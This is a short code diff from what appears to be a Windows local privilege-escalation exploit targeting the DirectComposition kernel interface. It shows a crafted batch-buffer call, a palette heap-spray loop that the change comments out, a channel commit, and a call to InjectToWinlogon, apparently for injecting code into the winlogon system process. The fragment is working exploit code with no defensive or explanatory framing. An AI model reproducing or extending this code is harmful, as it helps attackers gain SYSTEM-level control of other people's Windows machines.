@@ -618,10 +618,12 @@ int main(int argc, TCHAR* argv[]) {
     *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
 
+    /*
     for (size_t i = 0; i < 0x5000; i++)
     {
         createPaletteofSize2(g_pExploitCtx->ObjectSize);
     }
+    */
 
     NtDCompositionCommitChannel(hChannel, &dwArg1, &dwArg2, 0, NULL);
     InjectToWinlogon();
